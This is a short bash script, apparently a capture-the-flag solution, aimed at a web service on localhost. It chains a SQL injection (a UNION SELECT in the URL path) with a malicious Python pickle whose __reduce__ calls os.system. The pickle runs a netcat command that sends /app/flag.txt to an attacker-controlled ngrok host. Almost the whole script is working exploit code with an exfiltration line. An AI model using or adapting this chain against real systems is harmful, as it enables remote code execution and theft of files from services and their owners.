RHOST=localhost:1337

# address of a tcp server owned by us to collect the flag
LHOST=0.tcp.ngrok.io
LPORT=15981

# gen pickle b64 encoded string that will send the flag to a tcp server we've setup through ngrok
gen_hash () {
python3 - <<EOF
import pickle, os, base64
class P(object):
	def __reduce__(self):
		return (os.system,("nc $LHOST $LPORT < /app/flag.txt",))
print(base64.b64encode(pickle.dumps(P())).decode())
EOF
}

url_encode() {
	python3 -c "import sys; from urllib.parse import quote; print(quote(sys.stdin.read()));";
}

# send curl with sql injection
payload=$(echo -n "2' UNION SELECT '$(gen_hash)'; --" | url_encode)
curl "http://$RHOST/view/$payload" > /dev/null

echo "Flag should have been sent to your tcp server"

